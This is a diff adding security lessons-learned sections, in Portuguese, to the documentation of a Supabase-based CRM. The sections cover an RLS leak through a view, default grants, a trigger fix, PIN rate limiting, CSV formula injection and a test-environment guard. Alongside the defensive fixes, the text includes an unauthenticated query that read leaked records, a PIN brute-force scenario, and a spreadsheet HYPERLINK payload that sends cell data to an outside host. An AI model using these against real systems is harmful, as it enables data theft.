@@ -566,6 +566,290 @@ select count(*) from estabelecimentos where updated_at <> created_at;  -- tem qu
 Se esse número for > 0 depois de uma 2ª execução, a carga está atualizando linhas existentes
 mesmo sem duplicá-las — e alguma edição manual pode ter sido sobrescrita.
 
+### 2.15 View sem `security_invoker` vaza a base inteira para `anon` — e a anon key é pública
+
+**(a) Problema.** Medido ao vivo em produção, na abertura da ETAPA 07 (portão
+adversarial), **antes de qualquer ataque escrito**:
+
+```
+GET /rest/v1/empresas_estabelecimentos?select=*    (só a anon key, SEM login)
+→ HTTP 200
+[{"cnpj_completo":"00074569006302","razao_social":"RIO DE JANEIRO REFRESCOS LTDA",
+  "capital_social":532134973.45,"email":"JURIDICOBR@KOANDINA.COM", ...}]
+```
+
+A view `empresas_estabelecimentos` (join `empresas` × `estabelecimentos`) foi criada
+**sem `security_invoker = on`**. Sem essa opção, a view roda com os privilégios do
+dono (`postgres`) e **ignora a RLS das tabelas base**. As tabelas estavam corretas —
+`anon` recebia `[]` em `empresas` e em `trabalhadores` —, mas a view entregava tudo.
+
+Três fatos que transformam isso de aviso em vazamento real:
+
+1. **A anon key não é segredo.** Ela vai no bundle JS publicado em
+   `crm.sindcompassos.org`. Qualquer visitante a lê no DevTools.
+2. **A view tinha `GRANT SELECT` a `anon`** — privilégio de fábrica do projeto
+   Supabase, não escrito por nenhuma migration nossa (ver §2.16).
+3. **A view não existia em nenhum arquivo do repositório.** Foi criada direto no
+   banco, provavelmente como conveniência durante a carga da RFB (ETAPA 06). Por
+   não estar versionada, nunca passou por revisão — e as 12 views que *estão* nos
+   arquivos `sql/` têm `security_invoker = on`, todas.
+
+**(b) Solução.** Uma linha:
+
+```sql
+alter view public.empresas_estabelecimentos set (security_invoker = on);
+```
+
+Medido depois da correção, na mesma sessão:
+
+| ator | antes | depois |
+|---|---|---|
+| `anon` (sem login) | **dados reais** | `[]` |
+| Admin | 2 linhas | 2 linhas ✅ |
+| Secretaria | 2 linhas | 2 linhas ✅ |
+| Parceiro | 2 linhas ⚠️ | 0 linhas ✅ |
+
+O parceiro **também** estava lendo a base empresarial, que não é do domínio dele —
+a mesma falha, um degrau abaixo. O controle negativo (Admin e Secretaria continuam
+lendo) prova que a correção não é "negar tudo".
+
+**(c) Como implantar.** Duas varreduras, e nenhuma delas é "reler as migrations":
+
+```sql
+-- 1. Toda view de `public`: quais NÃO são security_invoker e quem lê.
+select c.relname,
+       coalesce((select option_value from pg_options_to_table(c.reloptions)
+                  where option_name='security_invoker'), 'off_default') as invoker,
+       has_table_privilege('anon', c.oid, 'SELECT')          as anon_le,
+       has_table_privilege('authenticated', c.oid, 'SELECT') as auth_le
+from pg_class c join pg_namespace n on n.oid = c.relnamespace
+where n.nspname = 'public' and c.relkind in ('v','m');
+```
+
+Toda linha com `invoker <> 'on'` **e** `anon_le = true` é vazamento até prova em
+contrário — e a prova é uma requisição `curl` real, nunca leitura de código. A única
+exceção legítima hoje é `v_fila_parceiro`, que é definer de propósito (esconde CPF do
+parceiro) e se protege pelo `where s.parceiro_id = fn_parceiro_id()`; medida também,
+ela devolve `401 permission denied for function fn_parceiro_id` para `anon`.
+
+```sql
+-- 2. Objeto que existe no banco e NÃO existe no repositório.
+```
+Comparar `pg_class` com `grep -rn "create .*view" sql/`. **Objeto criado ad hoc
+durante uma carga é o que mais escapa da revisão**, porque nenhuma leitura de código
+o encontra — ele não está no código. Rodar essa comparação ao fim de toda etapa que
+mexa no banco fora dos arquivos `sql/`.
+
+**Regra geral que fica:** `create view` neste projeto **sempre** com
+`with (security_invoker = on)`, e a exceção deliberada precisa de comentário dizendo
+por quê e de um filtro interno que substitua a RLS que ela desligou.
+
+### 2.16 Privilégio de fábrica: `anon` nasce com TRUNCATE em tudo — e view não tem RLS
+
+**(a) Problema.** Duas heranças do projeto Supabase que nenhuma migration nossa pediu, medidas na
+ETAPA 07:
+
+1. **`anon` e `authenticated` tinham `TRUNCATE`, `REFERENCES` e `TRIGGER` nas 43 relações de
+   `public`.** `TRUNCATE` **não passa por RLS** — é privilégio de tabela.
+2. **View não tem RLS.** Quem decide o que uma view mostra é o `security_invoker` e o `GRANT`. Uma
+   view sem `security_invoker = on` roda como o dono e ignora a RLS das tabelas base (§2.15).
+
+**(b) Solução.** Para o item 1, medir antes de correr: **não era explorável**. `anon` e
+`authenticated` têm `rolcanlogin = false` (ninguém se conecta como elas), o PostgREST não tem verbo
+`TRUNCATE`, e nenhuma das duas tem `CREATE` em `public` nem no banco — logo não podem criar a
+função que faria o `TRUNCATE` por dentro. Revogou-se assim mesmo: custo zero, e o dia em que uma
+função `SECURITY INVOKER` nova apagar linhas, a diferença entre ter e não ter esse `GRANT` é a base
+inteira.
+
+**(c) Como implantar.** A varredura que mede, e a revogação que fecha — **por `pg_class`, não por
+`pg_tables`**: usar `pg_tables` deixou 78 grants de pé, porque as views também os carregam.
+
+```sql
+-- Mede
+select grantee, table_name, privilege_type
+  from information_schema.role_table_grants
+ where table_schema='public' and grantee in ('anon','authenticated')
+   and privilege_type in ('TRUNCATE','REFERENCES','TRIGGER');
+
+-- Antes de tratar como incidente, verifique se é alcançável:
+select rolname, rolcanlogin from pg_roles where rolname in ('anon','authenticated');
+select has_schema_privilege('authenticated','public','CREATE');
+
+-- Fecha (ver sql/19_hardening_adversarial.sql)
+do $
+declare r record;
+begin
+  for r in select format('%I.%I', n.nspname, c.relname) as alvo
+             from pg_class c join pg_namespace n on n.oid=c.relnamespace
+            where n.nspname='public' and c.relkind in ('r','v','m','p')
+  loop
+    execute format('revoke truncate, references, trigger on %s from anon, authenticated', r.alvo);
+  end loop;
+end $;
+```
+
+### 2.17 Trigger que substitui um `DEFAULT` precisa ser `SECURITY DEFINER`
+
+**(a) Problema.** `fn_gera_numero_guia()` era chamável por RPC (`POST /rest/v1/rpc/...`) por
+qualquer papel autenticado, inclusive o parceiro. Como ela faz `nextval('seq_numero_guia')`, cada
+chamada **consome a numeração** das guias: em loop, a próxima guia real sairia como `2026-847392`.
+
+A correção óbvia — tirar do `DEFAULT` da coluna, pôr num trigger `BEFORE INSERT` e revogar
+`EXECUTE` — **quebrou a criação de guias**. Doze testes ficaram vermelhos com
+`permission denied for function fn_gera_numero_guia`. Motivo: função de trigger é `SECURITY
+INVOKER` por padrão, então roda com os privilégios de **quem inseriu** — e esse acabara de perder
+o `EXECUTE`.
+
+**(b) Solução.** O trigger precisa ser `SECURITY DEFINER`, dono `postgres`. Assim ele chama a
+geradora como o dono, e o usuário continua sem alcançá-la pela API.
+
+**(c) Como implantar.**
+
+```sql
+alter table solicitacoes_servico alter column numero_guia drop default;
+
+create or replace function fn_numera_guia()
+returns trigger language plpgsql
+security definer                         -- ← sem isto, quebra o INSERT legítimo
+set search_path = public, extensions, pg_temp
+as $
+begin
+  if new.numero_guia is null then new.numero_guia := fn_gera_numero_guia(); end if;
+  return new;
+end $;
+alter function fn_numera_guia() owner to postgres;
+
+create trigger trg_numera_guia before insert on solicitacoes_servico
+  for each row execute function fn_numera_guia();
+
+revoke execute on function fn_gera_numero_guia() from public, anon, authenticated;
+```
+
+**Regra geral:** sempre que revogar `EXECUTE` de uma função, procure antes por `column_default` e
+por outras funções que a chamem — o `DEFAULT` de coluna roda com o privilégio de quem insere.
+
+```sql
+select table_name, column_name, column_default from information_schema.columns
+ where table_schema='public' and column_default ilike '%nome_da_funcao%';
+```
+
+### 2.18 `raise exception` desfaz o `insert` que você acabou de fazer — inclusive o do rate limit
+
+**(a) Problema.** `fn_registrar_checkin` (endpoint público, sem login) aceitava tentativas de PIN
+sem nenhum freio: **15 tentativas em 731ms, zero bloqueios**. Como o PIN tem 4 a 6 dígitos, o
+espaço de 10.000 candidatos cai em ~8 minutos, e o prêmio é marcar guias como `executada` — o que
+faz o convênio cobrar do sindicato.
+
+A primeira correção — gravar cada tentativa numa tabela e travar após 5 falhas — **não funcionou, e
+o teste provou**: as 15 tentativas continuaram passando. `RAISE EXCEPTION` aborta a transação
+inteira da chamada, e o `INSERT` que registrava a tentativa ia junto no rollback. O contador nunca
+saía de zero.
+
+**(b) Solução.** Não existe transação autônoma em plpgsql. Então o caminho de recusa deixou de ser
+exceção e passou a ser **resultado**: a função devolve `{"ok": false, "erro": "..."}`, a transação
+confirma, o registro persiste e o freio conta de verdade. O `error` do supabase-js fica reservado a
+falha real de transporte.
+
+**(c) Como implantar.** Ver `sql/19_hardening_adversarial.sql`. O padrão:
+
+```sql
+if v_falhas >= 5 then
+  return jsonb_build_object('ok', false, 'erro', 'Muitas tentativas...');  -- NÃO raise
+end if;
+...
+if not found then
+  insert into tentativas_checkin (token_alvo, sucesso) values (p_token, false);
+  return jsonb_build_object('ok', false, 'erro', 'Senha de recepcionamento inválida');
+end if;
+```
+
+E **todo chamador precisa acompanhar**: `GuiaPublicaPage.tsx` passou a olhar `data.ok === false`
+antes de `error`. Bloquear **por token**, nunca por parceiro: travar o parceiro inteiro deixaria um
+atacante derrubar o balcão de um convênio legítimo só errando o PIN de propósito.
+
+### 2.19 CSV exportado executa fórmula no Excel — e o caminho começa no formulário público
+
+**(a) Problema.** O Excel e o LibreOffice avaliam como **fórmula** toda célula que comece com `=`,
+`+`, `-`, `@`, TAB ou CR. As aspas do CSV não defendem: elas são do formato e somem no parse. No
+CRM Sindcom o caminho existe inteiro — o formulário público de filiação (Edge Function, sem login)
+grava `nome_completo` sem sanitizar; a Secretaria exporta a listagem; o Excel abre. Um nome
+cadastrado como `=HYPERLINK("http://.../?d="&A1,"clique")` executa na máquina dela.
+
+**(b) Solução.** Neutralizar o primeiro caractere no gerador do CSV, com apóstrofo — o Excel o
+consome e trata o resto como texto.
+
+**(c) Como implantar.** Em `src/lib/csv.ts`, aplicado a todo valor antes do `Papa.unparse`:
+
+```ts
+function neutralizarFormula(valor: string): string {
+  return /^[=+\-@\t\r]/.test(valor) ? `'${valor}` : valor;
+}
+```
+
+**Controle negativo obrigatório:** valor negativo (`-50,00`) é o caso legítimo mais comum num CRM
+que exporta dinheiro — conferir que continua legível depois da neutralização.
+
+### 2.20 A suíte anunciava BENCH e atacava PRODUÇÃO — o Vitest carrega `.env.test` sozinho
+
+**(a) Problema.** Na ETAPA 07, os testes destrutivos passaram a escolher o banco por
+`SINDCOM_ALVO=bench`, com `dotenv` lendo `.env.bench`. A suíte imprimia `alvo=BENCH` — e batia no
+Supabase de **produção**. O Vitest (via Vite) carrega `.env` e `.env.test` sozinho, antes dos
+helpers, e o `dotenv` **não sobrescreve** variável já existente: os e-mails de teste vinham do
+`.env.bench`, mas `VITE_SUPABASE_URL` continuava a de produção.
+
+Um ataque destrutivo com o guard esquecido teria rodado contra a base real.
+
+**(b) Solução.** Duas camadas:
+
+1. `config({ path: ..., override: true })` — o arquivo escolhido manda.
+2. **Trava dura com o ref cravado no código**, não em variável de ambiente — justamente para não
+   depender de um `.env` estar certo. Se o alvo pedido não for o alvo real, recusa no import.
+
+**(c) Como implantar.** Em `tests/rls/helpers.ts`:
+
+```ts
+const REF_PRODUCAO = "vcswvscjqifelslsdjth";   // cravado de propósito
+config({ path: ALVO_BENCH ? ".env.bench" : ".env.test", override: true });
+
+if (ALVO_BENCH && ehProducao()) {
+  throw new Error("SINDCOM_ALVO=bench, mas VITE_SUPABASE_URL aponta para PRODUÇÃO.");
+}
+export function exigirBench(oQue: string) { if (ehProducao()) throw new Error(...); }
+```
+
+**Regra geral:** teste que escolhe ambiente por variável precisa **provar** em qual ambiente está,
+não anunciar. Imprimir o `ref` do projeto no início da execução custa uma linha.
+
+### 2.21 `getUser()` por arquivo estoura o rate limit de auth — e o sintoma parece RLS quebrada
+
+**(a) Problema.** O Vitest dá a cada arquivo de teste um registro de módulos próprio, então cache
+em memória não atravessa a fronteira entre arquivos. Com 18 arquivos × 5 papéis, cada chamada de
+`getUser()` (que é requisição de rede ao endpoint de auth) somava ~65 requisições em segundos.
+Resultado: `Request rate limit reached` derrubando arquivos inteiros — e, quando não derruba, o
+cliente cai para anônimo e a RLS nega tudo, o que aparece como "conjunto vazio onde deveria haver
+linha": **idêntico a uma RLS quebrada**.
+
+**(b) Solução.** Duas medidas somadas:
+
+1. `tests/rls/globalSetup.ts` autentica os 5 papéis **uma vez por execução**, no processo
+   principal, e grava as sessões num cache em disco gitignorado (com o `ref` do projeto em cada
+   entrada, para nunca reaproveitar token do bench contra produção).
+2. `loginComo()` monta o cliente com `setSession()` e tira o uid do **próprio JWT**, decodificado
+   localmente — nada de `getUser()`.
+
+**(c) Como implantar.** `vitest.config.ts` ganha `globalSetup: ["./tests/rls/globalSetup.ts"]`, e
+o helper decodifica o `sub`:
+
+```ts
+function subDoToken(accessToken: string): string | null {
+  const payload = accessToken.split(".")[1];
+  const json = Buffer.from(payload.replace(/-/g,"+").replace(/_/g,"/"), "base64").toString("utf8");
+  return (JSON.parse(json) as { sub?: string }).sub ?? null;
+}
+```
+
+Medido: de 6 arquivos caindo por rate limit para **159/160 verdes** em execução única.
+
 ## 3. Integrações (n8n, e-mail, Docker)
 
 ### 3.1 Titan grátis não faz SMTP externo
